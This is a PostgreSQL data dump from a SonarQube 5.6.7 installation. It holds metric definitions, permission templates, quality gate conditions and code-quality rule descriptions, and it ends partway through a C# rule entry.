43	new_line_coverage	Line coverage of added/changed code	1	Coverage	Line Coverage on New Code	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	t	1
44	coverage_line_hits_data	Coverage hits by line	0	Coverage	Coverage Hits by Line	f	DATA	f	t	\N	\N	f	f	t	\N
45	conditions_to_cover	Branches to cover	0	Coverage	Branches to Cover	f	INT	f	t	\N	\N	f	t	f	\N
46	new_conditions_to_cover	Branches to cover on New Code	0	Coverage	Branches to Cover on New Code	f	INT	f	t	\N	\N	f	t	t	\N
47	uncovered_conditions	Uncovered conditions	-1	Coverage	Uncovered Conditions	f	INT	f	t	\N	0.00000000000000000000	f	f	f	\N
48	new_uncovered_conditions	Uncovered conditions on new code	-1	Coverage	Uncovered Conditions on New Code	f	INT	f	t	\N	0.00000000000000000000	f	f	t	\N
49	branch_coverage	Condition coverage	1	Coverage	Condition Coverage	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	f	1
50	new_branch_coverage	Condition coverage of new/changed code	1	Coverage	Condition Coverage on New Code	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	t	1
51	conditions_by_line	Conditions by line	0	Coverage	Conditions by Line	f	DATA	f	t	\N	\N	f	f	t	\N
52	covered_conditions_by_line	Covered conditions by line	0	Coverage	Covered Conditions by Line	f	DATA	f	t	\N	\N	f	f	t	\N
53	it_coverage	Integration tests coverage	1	Coverage	IT Coverage	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	f	1
54	new_it_coverage	Integration tests coverage of new/changed code	1	Coverage	Coverage by IT on New Code	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	t	1
55	it_lines_to_cover	Lines to cover by Integration Tests	1	Coverage	IT Lines to Cover	f	INT	f	t	\N	\N	f	t	f	\N
56	new_it_lines_to_cover	Lines to cover on new code by integration tests	-1	Coverage	Lines to Cover by IT on New Code	f	INT	f	t	\N	\N	f	f	t	\N
57	it_uncovered_lines	Uncovered lines by integration tests	-1	Coverage	IT Uncovered Lines	f	INT	f	t	\N	\N	f	f	f	\N
58	new_it_uncovered_lines	New lines that are not covered by integration tests	-1	Coverage	Uncovered Lines by IT on New Code	f	INT	f	t	\N	0.00000000000000000000	f	f	t	\N
59	it_line_coverage	Line coverage by integration tests	1	Coverage	IT Line Coverage	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	f	1
60	new_it_line_coverage	Integration tests line coverage of added/changed code	1	Coverage	Line Coverage by IT on New Code	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	t	1
61	it_coverage_line_hits_data	Coverage hits by line by integration tests	0	Coverage	IT Coverage Hits by Line	f	DATA	f	t	\N	\N	f	f	t	\N
62	it_conditions_to_cover	Integration Tests conditions to cover	1	Coverage	IT Branches to Cover	f	INT	f	t	\N	\N	f	t	f	\N
63	new_it_conditions_to_cover	Branches to cover by Integration Tests on New Code	0	Coverage	Branches to Cover by IT on New Code	f	INT	f	t	\N	\N	f	t	t	\N
64	it_uncovered_conditions	Uncovered conditions by integration tests	-1	Coverage	IT Uncovered Conditions	f	INT	f	t	\N	\N	f	f	f	\N
65	new_it_uncovered_conditions	New conditions that are not covered by integration tests	-1	Coverage	Uncovered Conditions by IT on New Code	f	INT	f	t	\N	0.00000000000000000000	f	f	t	\N
66	it_branch_coverage	Condition coverage by integration tests	1	Coverage	IT Condition Coverage	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	f	1
67	new_it_branch_coverage	Integration tests condition coverage of new/changed code	1	Coverage	Condition Coverage by IT on New Code	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	t	1
68	it_conditions_by_line	IT conditions by line	0	Coverage	IT Conditions by Line	f	DATA	f	t	\N	\N	f	f	t	\N
69	it_covered_conditions_by_line	IT covered conditions by line	0	Coverage	IT Covered Conditions by Line	f	DATA	f	t	\N	\N	f	f	t	\N
70	overall_coverage	Overall test coverage	1	Coverage	Overall Coverage	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	f	1
71	new_overall_coverage	Overall coverage of new/changed code	1	Coverage	Overall Coverage on New Code	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	t	1
72	overall_lines_to_cover	Overall lines to cover by all tests	1	Coverage	Overall Lines to Cover	f	INT	f	t	\N	\N	f	t	f	\N
73	new_overall_lines_to_cover	New lines to cover by all tests	-1	Coverage	Overall Lines to Cover on New Code	f	INT	f	t	\N	\N	f	f	t	\N
74	overall_uncovered_lines	Uncovered lines by all tests	-1	Coverage	Overall Uncovered Lines	f	INT	f	t	\N	\N	f	f	f	\N
75	new_overall_uncovered_lines	New lines that are not covered by any tests	-1	Coverage	Overall Uncovered Lines on New Code	f	INT	f	t	\N	0.00000000000000000000	f	f	t	\N
76	overall_line_coverage	Line coverage by all tests	1	Coverage	Overall Line Coverage	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	f	1
77	new_overall_line_coverage	Line coverage of added/changed code by all tests	1	Coverage	Overall Line Coverage on New Code	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	t	1
78	overall_coverage_line_hits_data	Coverage hits by all tests and by line	0	Coverage	Overall Coverage Hits by Line	f	DATA	f	t	\N	\N	f	f	t	\N
79	overall_conditions_to_cover	Branches to cover by all tests	1	Coverage	Overall Branches to Cover	f	INT	f	t	\N	\N	f	t	f	\N
80	new_overall_conditions_to_cover	New branches to cover by all tests	0	Coverage	Overall Branches to Cover on New Code	f	INT	f	t	\N	\N	f	t	t	\N
81	overall_uncovered_conditions	Uncovered conditions by all tests	-1	Coverage	Overall Uncovered Conditions	f	INT	f	t	\N	\N	f	f	f	\N
82	new_overall_uncovered_conditions	New conditions that are not covered by any test	-1	Coverage	Overall Uncovered Conditions on New Code	f	INT	f	t	\N	0.00000000000000000000	f	f	t	\N
83	overall_branch_coverage	Condition coverage by all tests	1	Coverage	Overall Condition Coverage	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	f	1
84	new_overall_branch_coverage	Condition coverage of new/changed code by all tests	1	Coverage	Overall Condition Coverage on New Code	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	t	1
85	overall_conditions_by_line	Overall conditions by all tests and by line	0	Coverage	Overall Conditions by Line	f	DATA	f	t	\N	\N	f	f	t	\N
86	overall_covered_conditions_by_line	Overall covered conditions by all tests and by line	0	Coverage	Overall Covered Conditions by Line	f	DATA	f	t	\N	\N	f	f	t	\N
87	duplicated_lines	Duplicated lines	-1	Duplications	Duplicated Lines	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
88	duplicated_blocks	Duplicated blocks	-1	Duplications	Duplicated Blocks	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
89	duplicated_files	Duplicated files	-1	Duplications	Duplicated Files	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
90	duplicated_lines_density	Duplicated lines balanced by statements	-1	Duplications	Duplicated Lines (%)	t	PERCENT	f	t	100.00000000000000000000	0.00000000000000000000	t	f	f	1
91	duplications_data	Duplications details	0	Duplications	Duplication Details	f	DATA	f	t	\N	\N	f	f	t	\N
92	violations	Issues	-1	Issues	Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
93	blocker_violations	Blocker issues	-1	Issues	Blocker Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
94	critical_violations	Critical issues	-1	Issues	Critical Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
95	major_violations	Major issues	-1	Issues	Major Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
96	minor_violations	Minor issues	-1	Issues	Minor Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
97	info_violations	Info issues	-1	Issues	Info Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
98	new_violations	New issues	-1	Issues	New Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	t	\N
99	new_blocker_violations	New Blocker issues	-1	Issues	New Blocker Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	t	\N
100	new_critical_violations	New Critical issues	-1	Issues	New Critical Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	t	\N
101	new_major_violations	New Major issues	-1	Issues	New Major Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	t	\N
102	new_minor_violations	New Minor issues	-1	Issues	New Minor Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	t	\N
103	new_info_violations	New Info issues	-1	Issues	New Info Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	t	\N
104	false_positive_issues	False positive issues	-1	Issues	False Positive Issues	f	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
105	wont_fix_issues	Won't fix issues	-1	Issues	Won't Fix Issues	f	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
106	open_issues	Open issues	-1	Issues	Open Issues	f	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
107	reopened_issues	Reopened issues	-1	Issues	Reopened Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
108	confirmed_issues	Confirmed issues	-1	Issues	Confirmed Issues	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
109	code_smells	Code Smells	-1	Maintainability	Code Smells	f	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
110	new_code_smells	New Code Smells	-1	Maintainability	New Code Smells	t	INT	f	t	\N	0.00000000000000000000	t	f	t	\N
111	bugs	Bugs	-1	Reliability	Bugs	f	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
112	new_bugs	New Bugs	-1	Reliability	New Bugs	t	INT	f	t	\N	0.00000000000000000000	t	f	t	\N
113	vulnerabilities	Vulnerabilities	-1	Security	Vulnerabilities	f	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
114	new_vulnerabilities	New Vulnerabilities	-1	Security	New Vulnerabilities	t	INT	f	t	\N	0.00000000000000000000	t	f	t	\N
115	sqale_index	Total effort (in days) to fix all the issues on the component and therefore to comply to all the requirements.	-1	Maintainability	Technical Debt	t	WORK_DUR	f	t	\N	0.00000000000000000000	t	f	f	\N
116	new_technical_debt	Added technical debt	-1	Maintainability	Added Technical Debt	t	WORK_DUR	f	t	\N	0.00000000000000000000	t	f	t	\N
117	sqale_rating	A-to-E rating based on the technical debt ratio	-1	Maintainability	Maintainability Rating	t	RATING	f	t	5.00000000000000000000	1.00000000000000000000	f	f	f	\N
118	development_cost	SQALE development cost	-1	Maintainability	SQALE Development Cost	t	STRING	f	t	\N	0.00000000000000000000	t	t	f	\N
119	sqale_debt_ratio	Ratio of the actual technical debt compared to the estimated cost to develop the whole source code from scratch	-1	Maintainability	Technical Debt Ratio	t	PERCENT	f	t	100.00000000000000000000	0.00000000000000000000	t	f	f	1
120	new_sqale_debt_ratio	Technical Debt Ratio of new/changed code.	-1	Maintainability	Technical Debt Ratio on New Code	t	PERCENT	f	t	100.00000000000000000000	0.00000000000000000000	t	f	f	1
121	effort_to_reach_maintainability_rating_a	Effort to reach maintainability rating A	-1	Maintainability	Effort to Reach Maintainability Rating A	t	WORK_DUR	f	t	\N	0.00000000000000000000	t	f	f	\N
122	reliability_remediation_effort	Reliability Remediation Effort	-1	Reliability	Reliability Remediation Effort	t	WORK_DUR	f	t	\N	0.00000000000000000000	t	f	f	\N
123	new_reliability_remediation_effort	Reliability remediation effort on new code	-1	Reliability	Reliability Remediation Effort on New Code	t	WORK_DUR	f	t	\N	0.00000000000000000000	t	f	t	\N
124	reliability_rating	Reliability rating	-1	Reliability	Reliability Rating	t	RATING	f	t	5.00000000000000000000	1.00000000000000000000	f	f	f	\N
125	security_remediation_effort	Security remediation effort	-1	Security	Security Remediation Effort	t	WORK_DUR	f	t	\N	0.00000000000000000000	t	f	f	\N
126	new_security_remediation_effort	Security remediation effort on new code	-1	Security	Security Remediation Effort on New Code	t	WORK_DUR	f	t	\N	0.00000000000000000000	t	f	t	\N
127	security_rating	Security rating	-1	Security	Security Rating	t	RATING	f	t	5.00000000000000000000	1.00000000000000000000	f	f	f	\N
128	ncloc_data	\N	0	Size	ncloc_data	f	DATA	f	t	\N	\N	f	t	f	\N
129	comment_lines_data	\N	0	Documentation	comment_lines_data	f	DATA	f	t	\N	\N	f	t	f	\N
130	executable_lines_data	\N	0	Coverage	executable_lines_data	f	DATA	f	t	\N	\N	f	t	f	\N
131	alert_status	The project status with regard to its quality gate.	1	Releasability	Quality Gate Status	t	LEVEL	f	t	\N	\N	f	f	f	\N
132	quality_gate_details	The project detailed status with regard to its quality gate	0	General	Quality Gate Details	f	DATA	f	t	\N	\N	f	f	f	\N
133	profile	Selected quality profile	0	General	Profile	f	DATA	f	t	\N	\N	f	f	f	\N
134	profile_version	Selected quality profile version	0	General	Profile Version	f	INT	f	t	\N	\N	f	t	f	\N
135	quality_profiles	Details of quality profiles used during analysis	0	General	Profiles	f	DATA	f	t	\N	\N	f	t	f	\N
136	last_commit_date	\N	0	SCM	Date of Last Commit	f	MILLISEC	f	t	\N	\N	f	t	f	\N
137	burned_budget	\N	0	Management	Burned budget	f	FLOAT	t	t	\N	\N	f	f	f	1
138	business_value	\N	1	Management	Business value	t	FLOAT	t	t	\N	\N	f	f	f	1
139	team_size	\N	0	Management	Team size	f	INT	t	t	\N	\N	f	f	f	\N
\.


--
-- TOC entry 2664 (class 0 OID 33149)
-- Dependencies: 230
-- Data for Name: notifications; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY notifications (id, data) FROM stdin;
\.


--
-- TOC entry 2690 (class 0 OID 33397)
-- Dependencies: 256
-- Data for Name: perm_templates_groups; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY perm_templates_groups (id, group_id, template_id, permission_reference, created_at, updated_at) FROM stdin;
1	1	1	admin	2017-11-23 16:16:53.653	2017-11-23 16:16:53.653
2	1	1	issueadmin	2017-11-23 16:16:53.658	2017-11-23 16:16:53.658
3	\N	1	user	2017-11-23 16:16:53.659	2017-11-23 16:16:53.659
4	\N	1	codeviewer	2017-11-23 16:16:53.66	2017-11-23 16:16:53.66
\.


--
-- TOC entry 2688 (class 0 OID 33389)
-- Dependencies: 254
-- Data for Name: perm_templates_users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY perm_templates_users (id, user_id, template_id, permission_reference, created_at, updated_at) FROM stdin;
\.


--
-- TOC entry 2686 (class 0 OID 33378)
-- Dependencies: 252
-- Data for Name: permission_templates; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY permission_templates (id, name, kee, description, created_at, updated_at, key_pattern) FROM stdin;
1	Default template	default_template	This permission template will be used as default when no other permission configuration is available	2017-11-23 16:16:53.638	2017-11-23 16:16:53.638	\N
\.


--
-- TOC entry 2633 (class 0 OID 32841)
-- Dependencies: 199
-- Data for Name: project_links; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY project_links (id, link_type, name, href, component_uuid) FROM stdin;
\.


--
-- TOC entry 2627 (class 0 OID 32808)
-- Dependencies: 193
-- Data for Name: project_measures; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY project_measures (id, value, metric_id, snapshot_id, rule_id, rules_category_id, text_value, tendency, measure_date, project_id, alert_status, alert_text, url, description, rule_priority, characteristic_id, person_id, variation_value_1, variation_value_2, variation_value_3, variation_value_4, variation_value_5, measure_data) FROM stdin;
\.


--
-- TOC entry 2700 (class 0 OID 33520)
-- Dependencies: 266
-- Data for Name: project_qprofiles; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY project_qprofiles (id, project_uuid, profile_key) FROM stdin;
\.


--
-- TOC entry 2621 (class 0 OID 32774)
-- Dependencies: 187
-- Data for Name: projects; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY projects (id, name, description, enabled, scope, qualifier, kee, root_id, language, copy_resource_id, long_name, person_id, created_at, path, deprecated_kee, uuid, project_uuid, module_uuid, module_uuid_path, authorization_updated_at) FROM stdin;
1	carina-demo	\N	t	PRJ	TRK	carina-demo	\N	\N	\N	carina-demo	\N	2017-11-23 16:18:46.086	\N	carina-demo	AV_prKLGzJFC7L4qK5gn	AV_prKLGzJFC7L4qK5gn	\N	.AV_prKLGzJFC7L4qK5gn.	1511453926138
\.


--
-- TOC entry 2645 (class 0 OID 32926)
-- Dependencies: 211
-- Data for Name: properties; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY properties (id, prop_key, resource_id, text_value, user_id) FROM stdin;
10	sonar.core.id	\N	20171123161605	\N
11	sonar.core.version	\N	5.6.7	\N
12	sonar.core.startTime	\N	2017-11-23T16:16:05+0000	\N
13	sonar.qualitygate	\N	1	\N
14	sonar.permission.template.default	\N	default_template	\N
15	sonar.github.endpoint	\N	https://api.github.com	\N
\.


--
-- TOC entry 2694 (class 0 OID 33452)
-- Dependencies: 260
-- Data for Name: quality_gate_conditions; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) FROM stdin;
1	1	114	1	GT	0	\N	2017-11-23 16:16:45.299	\N
2	1	112	1	GT	0	\N	2017-11-23 16:16:45.308	\N
3	1	120	1	GT	5	\N	2017-11-23 16:16:45.315	\N
4	1	37	1	LT	80	\N	2017-11-23 16:16:45.322	\N
\.


--
-- TOC entry 2692 (class 0 OID 33443)
-- Dependencies: 258
-- Data for Name: quality_gates; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY quality_gates (id, name, created_at, updated_at) FROM stdin;
1	SonarQube way	2017-11-23 16:16:45.286	\N
\.


--
-- TOC entry 2669 (class 0 OID 33180)
-- Dependencies: 235
-- Data for Name: resource_index; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY resource_index (id, kee, "position", name_size, resource_id, root_project_id, qualifier) FROM stdin;
1	carina-demo	0	11	1	1	TRK
2	arina-demo	1	11	1	1	TRK
3	rina-demo	2	11	1	1	TRK
4	ina-demo	3	11	1	1	TRK
5	na-demo	4	11	1	1	TRK
6	a-demo	5	11	1	1	TRK
7	-demo	6	11	1	1	TRK
8	demo	7	11	1	1	TRK
9	emo	8	11	1	1	TRK
\.


--
-- TOC entry 2629 (class 0 OID 32819)
-- Dependencies: 195
-- Data for Name: rules; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) FROM stdin;
1	Branches should have sufficient coverage by unit tests	InsufficientBranchCoverage	\N	common-js	An issue is created on a file as soon as the branch coverage on this file is less than the required threshold.It gives the number of branches to be covered in order to reach the required threshold.	2	\N	READY	js	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	number of uncovered conditions	\N	bad-practice	f	HTML	1511453806128	1511453806133	1
2	Lines should have sufficient coverage by unit tests	InsufficientLineCoverage	\N	common-js	An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.	2	\N	READY	js	\N	\N	\N	\N	\N	LINEAR	\N	2min	\N	\N	number of lines under the coverage threshold	\N	bad-practice	f	HTML	1511453806147	1511453806148	1
3	Source files should have a sufficient density of comment lines	InsufficientCommentDensity	\N	common-js	An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.	2	\N	READY	js	\N	\N	\N	\N	\N	LINEAR	\N	2min	\N	\N	number of lines required to meet minimum density	\N	convention	f	HTML	1511453806153	1511453806153	1
4	Source files should not have any duplicated blocks	DuplicatedBlocks	\N	common-js	An issue is created on a file as soon as there is at least one block of duplicated code on this file	2	\N	READY	js	\N	\N	\N	\N	\N	LINEAR_OFFSET	\N	10min	\N	10min	number of duplicate blocks	\N	pitfall	f	HTML	1511453806159	1511453806159	1
5	Skipped unit tests should be either removed or fixed	SkippedUnitTests	\N	common-js	Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.	2	\N	READY	js	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	number of skipped tests	\N	pitfall	f	HTML	1511453806163	1511453806164	1
6	Failed unit tests should be fixed	FailedUnitTests	\N	common-js	Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.	2	\N	READY	js	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	number of failed tests	\N	\N	f	HTML	1511453806167	1511453806167	2
7	Branches should have sufficient coverage by unit tests	InsufficientBranchCoverage	\N	common-java	An issue is created on a file as soon as the branch coverage on this file is less than the required threshold.It gives the number of branches to be covered in order to reach the required threshold.	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	number of uncovered conditions	\N	bad-practice	f	HTML	1511453806170	1511453806171	1
8	Lines should have sufficient coverage by unit tests	InsufficientLineCoverage	\N	common-java	An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR	\N	2min	\N	\N	number of lines under the coverage threshold	\N	bad-practice	f	HTML	1511453806177	1511453806177	1
9	Source files should have a sufficient density of comment lines	InsufficientCommentDensity	\N	common-java	An issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR	\N	2min	\N	\N	number of lines required to meet minimum density	\N	convention	f	HTML	1511453806189	1511453806189	1
10	Source files should not have any duplicated blocks	DuplicatedBlocks	\N	common-java	An issue is created on a file as soon as there is at least one block of duplicated code on this file	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR_OFFSET	\N	10min	\N	10min	number of duplicate blocks	\N	pitfall	f	HTML	1511453806196	1511453806196	1
11	Skipped unit tests should be either removed or fixed	SkippedUnitTests	\N	common-java	Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	number of skipped tests	\N	pitfall	f	HTML	1511453806199	1511453806200	1
12	Failed unit tests should be fixed	FailedUnitTests	\N	common-java	Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	number of failed tests	\N	\N	f	HTML	1511453806203	1511453806203	2
13	Exceptions should not be thrown from property getters	S2372	\N	csharpsquid	<p>\n    Property getters should be simple operations that are always safe to call. If exceptions need to be thrown, it is best to convert the property to a method.\n</p>\n<p>\n    It is valid to throw exceptions from indexed property getters and from property setters, which are not detected by this rule.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass\n{\n  public int Foo\n  {\n    get\n    {\n      throw new NotImplementedException();  //Non-Compliant\n    }\n    set\n    {\n      // ... some code ...\n    }\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nclass MyClass\n{\n  public void SetFoo(int value)\n  {\n    // ... some code ...\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	error-handling	f	HTML	1511453806207	1511453806207	1
14	Literal suffixes should be upper case	S818	\N	csharpsquid	<p>\n    Using upper case literal suffixes removes the potential ambiguity between "1" (digit 1) and "l" (letter el) for declaring literals.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nconst uint a = 0u;      // Noncompliant\nconst long b = 0l;      // Noncompliant\nconst ulong c = 0Ul;     // Noncompliant\nconst ulong d = 0uL;     // Noncompliant\nconst decimal e = 1.2m;  // Noncompliant\nconst float f = 1.2f;    // Noncompliant\nconst double g = 1.2d;    // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nconst uint a = 0U;\nconst long b = 0L;\nconst ulong c = 0UL;\nconst ulong d = 0UL;\nconst decimal e = 1.2M;\nconst float f = 1.2F;\nconst double g = 1.2D;\n</pre>\n\n<h2>See</h2>\n<ul>\n    <li>MISRA C++:2008, 2-13-4 - Literal suffixes shall be upper case</li>\n    <li>MISRA C:2012, 7.3 - The lowercase character "l" shall not be used in a literal suffix</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/koAtAQ">CERT DCL16-C</a> - Use "L," not "l," to indicate a long value</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/n4AtAQ">CERT DCL16-CPP</a> - Use "L," not "l," to indicate a long value</li>\n</ul>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,convention,misra,pitfall	f	HTML	1511453806211	1511453806211	1
15	Classes with "IDisposable" members should implement "IDisposable"	S2931	\N	csharpsquid	<p>\n    Classes with <code>IDisposable</code> members are responsible for cleaning up those members by calling\n    their <code>Dispose</code> methods. The best practice here is for the owning class to itself implement\n    <code>IDisposable</code> and call its members' <code>Dispose</code> methods from its own\n    <code>Dispose</code> method.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class ResourceHolder   // Noncompliant; doesn't implement IDisposable\n{\n  private FileStream fs;  // This member is never Dispose'd\n  public void OpenResource(string path)\n  {\n    this.fs = new FileStream(path, FileMode.Open);\n  }\n  public void CloseResource()\n  {\n    this.fs.Close();\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class ResourceHolder : IDisposable\n{\n  private FileStream fs;\n  public void OpenResource(string path)\n  {\n    this.fs = new FileStream(path, FileMode.Open);\n  }\n  public void CloseResource()\n  {\n    this.fs.Close();\n  }\n  public void Dispose()\n  {\n    this.fs.Dispose();\n  }\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li> <a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup</li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cwe,denial-of-service	f	HTML	1511453806218	1511453806218	2
16	Property assignments should not be made for "readonly" fields not constrained to reference types	S2934	\N	csharpsquid	<p>\n    While the properties of a <code>readonly</code> reference type field can still be changed after initialization,\n    those of a <code>readonly</code> value field, such as a <code>struct</code>, cannot.\n</p>\n<p>\n    If the member could be either a <code>class</code> or a <code>struct</code> then assignment to its properties\n    could be unreliable, working sometimes but not others.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\ninterface IPoint\n{\n  int X { get; set; }\n  int Y { get; set; }\n}\n\nclass PointManager&lt;T&gt; where T: IPoint\n{\n  readonly T point;  // this could be a struct\n  public PointManager(T point)\n  {\n    this.point = point;\n  }\n\n  public void MovePointVertically(int newX)\n  {\n    point.X = newX; //Noncompliant; if point is a struct, then nothing happened\n    Console.WriteLine(point.X);\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\ninterface IPoint\n{\n  int X { get; set; }\n  int Y { get; set; }\n}\n\nclass PointManager&lt;T&gt; where T : IPoint\n{\n  readonly T point;  // this could be a struct\n  public PointManager(T point)\n  {\n    this.point = point;\n  }\n\n  public void MovePointVertically(int newX) // assignment has been removed\n  {\n    Console.WriteLine(point.X);\n  }\n}\n</pre>\nor\n<pre>\ninterface IPoint\n{\n  int X { get; set; }\n  int Y { get; set; }\n}\n\nclass PointManager&lt;T&gt; where T : class, IPoint\n{\n  readonly T point;  // this can only be a class\n  public PointManager(T point)\n  {\n    this.point = point;\n  }\n\n  public void MovePointVertically(int newX)\n  {\n    point.X = newX;  // this assignment is guaranteed to work\n    Console.WriteLine(point.X);\n  }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	\N	f	HTML	1511453806222	1511453806223	2
17	Fields that are only assigned in the constructor should be "readonly"	S2933	\N	csharpsquid	<p>\n    <code>readonly</code> fields can only be assigned in a class constructor. If a class has a field that's\n    not marked <code>readonly</code> but is only set in the constructor, it could cause confusion about the\n    field's intended use. To avoid confusion, such fields should be marked <code>readonly</code> to make their\n    intended use explicit, and to prevent future maintainers from inadvertently changing their use.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass Person\n{\n  int _birthYear;  // Noncompliant\n  Person(int birthYear)\n  {\n    _birthYear = birthYear;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass Person\n{\n  readonly int _birthYear;\n  Person(int birthYear)\n  {\n    _birthYear = birthYear;\n  }\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	confusing	f	HTML	1511453806228	1511453806230	1
18	Culture should be specified for "string" operations	S1449	\N	csharpsquid	<p>\n    <code>string.ToLower()</code>, <code>ToUpper</code>, <code>IndexOf</code>, <code>LastIndexOf</code>, and <code>Compare</code> are \n    all culture-dependent, as are some (floating point number and <code>DateTime</code>-related) calls to <code>ToString</code>. Fortunately, all have\n    variants which accept an argument specifying the culture or formatter to use. Leave that argument off and the call will use the\n    system default culture, possibly creating problems with international characters.\n</p>\n<p>\n    <code>string.CompareTo()</code> is also culture specific, but has no overload that takes a culture information, so instead it's better to use \n    <code>CompareOrdinal</code>, or <code>Compare</code> with culture.\n</p>\n<p>\n    Calls without a culture may work fine in the system's "home" environment, but break in ways that are extremely difficult to\n    diagnose for customers who use different encodings. Such bugs can be nearly, if not completely, impossible to reproduce when it's\n    time to fix them.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar lowered = someString.ToLower(); 